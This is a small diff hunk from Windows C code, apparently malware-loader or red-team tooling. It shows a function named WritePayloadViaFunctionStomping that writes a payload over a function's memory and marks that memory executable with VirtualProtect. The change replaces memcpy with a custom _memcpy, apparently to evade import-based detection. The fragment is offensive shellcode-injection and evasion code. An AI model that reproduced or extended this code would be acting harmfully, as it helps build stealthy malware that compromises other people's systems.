@@ -14,7 +14,7 @@ BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN 
 		return FALSE;
 	}
 
-	memcpy(*pAddress, pPayload, sPayloadSize);
+	_memcpy(*pAddress, pPayload, sPayloadSize);
 
 	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
 		DebugPrint("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
